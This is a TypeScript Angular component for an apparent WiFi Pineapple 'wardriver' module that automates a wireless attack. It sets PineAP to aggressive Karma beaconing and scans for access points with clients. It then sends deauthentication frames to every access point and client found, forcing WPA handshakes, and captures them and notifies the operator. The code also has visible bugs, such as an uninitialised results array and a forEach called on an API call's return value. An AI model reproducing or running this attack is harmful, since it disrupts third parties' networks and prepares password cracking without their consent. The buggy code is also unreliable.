import { Component, OnInit } from '@angular/core'; 
import { ApiService } from '../services/api.service'; 
import { StatusRootObject} from '../interfaces/status.interface';
import { APResult } from '../interfaces/reconresult.interface';

@Component({ 
    selector: 'lib-wardriver', 
    templateUrl: './wardriver.component.html', 
    styleUrls: ['./wardriver.component.css'] 
})

export class WarDriverComponent implements OnInit { 
    constructor(private API: ApiService) { }
    apiResponse = 'Unfulfilled Response';
    statusHeader: string = '';
    statusFileName: string = '';
    json_frontend: StatusRootObject;
    continousDeauth: boolean = false;
    scanResultsArray: Array<APResult>;
    
    populateTargetBSSIDs(): void {
        this.API.APIGet('/api/pineap/ssids', (resp) => {
            this.apiResponse = resp.ssids;
        });
    }

    get_status_file_name(): string {
        this.API.request({
            module: 'wardriver',
            action: 'build_status_file',
        }, (resp) => {
            this.statusFileName = resp;
        })
        return this.statusFileName;
    }

    get_status_file(statusFileName: string): any {
        this.API.request({
            module: 'wardriver',
            action: 'get_status_file',
            file_name: this.statusFileName,
        }, (resp) => {
            let json_file: StatusRootObject = resp;
            this.json_frontend = json_file;
            console.log(json_file);
        })
    }

    get_status(): void {
        let statusFileName: string = this.get_status_file_name();
        this.get_status_file(statusFileName);
        //this.render_status();
    }
    attackd(scanResultsArray: APResult[]): void {
        this.API.APIGet('/api/pineap/handshakes', (resp) => {  // start handshake capture
            if (resp.handshakes != null) {
                scanResultsArray.forEach(ap => { // loop through APs
                    let ap_deauth_payload = { // build ap deauth payload
                        bssid: ap.bssid,
                        multiplier: 1,
                        channel: 11,
                        clients: [] // ??  "clients": string[] | https://hak5.github.io/mk7-docs/docs/rest/pineap/pineap/
                    }
                    this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, (resp) => {  // deauth the ap
                        console.log('>ap deauthd: ' +ap.bssid)
                    }).forEach(client => { // loop through clients
                        let client_deauth_payload = { // build client deauth payload
                            bssid: ap.bssid,
                            mac: client.client_mac,
                            multiplier: 1,
                            channel: 11
                        }
                        this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => { // deauth a client
                            console.log('>deauthd: ' +client.client_mac);
                        });
                    });
                });
            }
        });
        console.log('>cooling down breifly, waiting for straggling handshakes');
        setTimeout(() => {
            this.API.APIPost('/api/pineap/handshakes/stop', null, (resp) => { // stop handshake capture
                console.log('>stopped handshake capture');
                this.API.APIGet('/api/pineap/handshakes', (resp) => {
                    if (resp.handshakes.length > 0) {
                        console.log('>handshakes found!');
                        const notification_payload = {
                            level: 1,
                            message: "HANDSHAKE FOUND!!!",
                            module_name: 'wardriver'
                        }
                        this.API.APIPut('/api/notifications', notification_payload, (resp) => {} );
                    }
                    else { console.log('>no handshakes found :('); }
                    }
                )
            });
        }, 20000);    
        if (this.continousDeauth) {
            this.attackd(scanResultsArray);
        }
    }
    
    run_scand(): void {
        const scan_opts = {
            "live":false,
            "scan_time":30,
            "band":"0"
        };

        const pineAP_aggro_settings = {
            'mode': 'advanced', 
            'settings': { 
                'ap_channel': '11', 
                'autostart': true,
                'autostartPineAP': true,
                'beacon_interval': 'AGGRESSIVE',
                'beacon_response_interval': 'AGGRESSIVE',
                'beacon_responses': true,
                'broadcast_ssid_pool': false,
                'capture_ssids': true,
                'connect_notifications': false,
                'disconnect_notifications': false,
                'enablePineAP': true,
                'karma': true,
                'logging': true,
                'pineap_mac': '5A:11:B0:A7:A9:09',
                'target_mac': 'FF:FF:FF:FF:FF:FF' 
            }
        }

        let self = this;
        this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, (resp) => {
            this.API.APIPost('/api/recon/stop', null, (resp) => {
                this.API.APIPost('/api/recon/start', scan_opts, (resp) => {
                    // notify end user of 30 second wait
                    setTimeout(() => {  
                    this.API.APIGet('/api/recon/scans/' + resp.scanID, (resp) => {
                        console.log('>apr len: ' +resp.APResults.length);
                        if (resp.APResults.length > 0) {
                            resp.APResults.forEach(ap => {
                                if (ap.clients != null) {
                                    ap.clients.forEach(client => {
                                        console.log('>client found!: ' + client.client_mac);
                                        self.scanResultsArray.push(ap);
                                    });
                                }
                                else { console.log('>AP found, but not with associated clients'); }
                            });
                            if (self.scanResultsArray != null) this.attackd(self.scanResultsArray);
                            else console.log('>sorry, nothing to attack');
                        }
                        else { console.log('>no APs found'); }
                    })}, 120000);
            });
        });
    });    
}

    ngOnInit() { 
        //this.populateTargetBSSIDs();
        //this.get_status();
        const pineAP_aggro_settings = {
            'mode': 'advanced', 
            'settings': { 
                'ap_channel': '11', 
                'autostart': true,
                'autostartPineAP': true,
                'beacon_interval': 'AGGRESSIVE',
                'beacon_response_interval': 'AGGRESSIVE',
                'beacon_responses': true,
                'broadcast_ssid_pool': false,
                'capture_ssids': true,
                'connect_notifications': false,
                'disconnect_notifications': false,
                'enablePineAP': true,
                'karma': true,
                'logging': true,
                'pineap_mac': '5A:11:B0:A7:A9:09',
                'target_mac': 'FF:FF:FF:FF:FF:FF' 
            }
        }

        const stopPineAP = new Promise((resolve) => {
            this.API.APIPost('/api/recon/stop', null, (resp) => {
                if (resp.success) {
                    return resolve('>recon stopped');
                }
                //else return reject(new Error('>could not stop recon:' +resp.error));
            });
        });

        const pushSettings = new Promise ((resolve, reject) => {
            this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, (resp) => {
                if(resp.success) return resolve(true);
                else return reject(new Error('>could not push settings:' +resp.error));
            });
        });

        let settingsPushed = false;
        let reconStopped = false;
        async function startWardriver() {
            this.settingsPushed = await pushSettings;
            if (settingsPushed) {
                this.reconStopped = await stopPineAP;
            }
        }
        startWardriver();
        //this.run_scand();
    } 
}